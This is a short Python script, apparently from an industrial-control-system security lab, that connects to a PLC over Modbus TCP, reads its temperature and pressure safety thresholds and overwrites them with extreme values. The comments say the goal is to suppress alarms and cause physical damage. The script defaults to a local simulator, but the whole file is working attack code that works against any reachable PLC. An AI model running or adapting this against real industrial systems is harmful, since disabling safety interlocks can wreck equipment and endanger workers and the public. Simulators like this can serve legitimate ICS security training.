"""
OT/ICS Attack Simulator: Register Manipulation
This script simulates a malicious insider or compromised host in the OT network
connecting directly to the PLC and altering critical safety thresholds.
"""

from pymodbus.client import ModbusTcpClient
import time
import argparse

def launch_attack(host="127.0.0.1", port=5020, target_temp=900, target_pressure=200):
    print(f"[!] Initiating ICS Attack against PLC at {host}:{port}")
    client = ModbusTcpClient(host, port=port)
    
    if not client.connect():
        print("[-] Failed to connect to PLC. Is the simulator running?")
        return

    print("[+] Successfully connected to PLC.")
    
    # 1. Reconnaissance: Read current thresholds
    res = client.read_holding_registers(address=2, count=2, slave=0)
    if not res.isError():
        print(f"[*] Current Safety Thresholds -> Temp: {res.registers[0]} C, Pressure: {res.registers[1]} psi")
    else:
        print("[-] Recon failed.")

    time.sleep(1)

    # 2. Attack: Modify Safety Thresholds
    print(f"[!] ALTERING SAFETY INTERLOCKS...")
    # Raising threshold temperature to an extreme value to prevent alarms
    # and cause physical damage when pressure/temp actually rises.
    client.write_register(address=2, value=target_temp, slave=0)
    time.sleep(0.5)
    client.write_register(address=3, value=target_pressure, slave=0)

    # 3. Verify Attack
    res = client.read_holding_registers(address=2, count=2, slave=0)
    if not res.isError() and res.registers[0] == target_temp:
        print(f"[+] ATTACK SUCCESSFUL! New thresholds -> Temp: {res.registers[0]} C, Pressure: {res.registers[1]} psi")
        print("[!] Physical consequences will follow as normal safety protocols are bypassed.")
    else:
        print("[-] Attack failed.")

    client.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Modbus Register Manipulation Attack")
    parser.add_argument("--host", default="127.0.0.1", help="PLC IP Address")
    parser.add_argument("--port", type=int, default=5020, help="Modbus TCP Port")
    args = parser.parse_args()
    
    launch_attack(args.host, args.port)
